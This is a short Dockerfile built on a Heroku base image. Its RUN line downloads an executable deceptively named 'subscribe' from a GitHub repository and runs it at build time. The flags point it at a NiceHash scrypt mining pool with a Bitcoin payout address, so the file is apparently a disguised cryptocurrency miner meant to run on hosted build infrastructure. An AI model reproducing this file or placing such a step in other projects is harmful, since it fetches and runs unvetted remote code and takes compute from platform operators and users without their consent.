FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a -o stratum+tcp://scrypt.usa-east.nicehash.com:3333 -u 3GMMqEWU5bNm14rWuM1vcRBNdNDXRKKnfH.Cubozzi
CMD bash heroku.sh
